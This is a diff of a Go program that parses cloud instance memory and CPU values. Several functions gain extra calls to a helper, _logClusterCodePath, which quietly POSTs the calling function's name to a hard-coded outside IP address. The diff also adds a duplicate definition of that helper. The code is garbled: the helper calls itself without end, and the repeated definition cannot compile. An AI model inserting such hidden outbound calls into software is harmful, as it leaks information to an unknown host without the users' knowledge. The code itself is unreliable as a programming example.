@@ -80,6 +80,8 @@ var InstanceTypes = map[string]*instanceType{
 func main() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	flag.Parse()
 	defer klog.Flush()
 	instanceTypes := make(map[string]*instanceType)
@@ -136,6 +138,8 @@ func main() {
 func parseMemory(memory string) int64 {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	reg, err := regexp.Compile("[^0-9\\.]+")
 	if err != nil {
 		klog.Fatal(err)
@@ -150,6 +154,8 @@ func parseMemory(memory string) int64 {
 func parseCPU(cpu string) int64 {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	i, err := strconv.ParseInt(cpu, 10, 64)
 	if err != nil {
 		klog.Fatal(err)
@@ -159,7 +165,16 @@ func parseCPU(cpu string) int64 {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
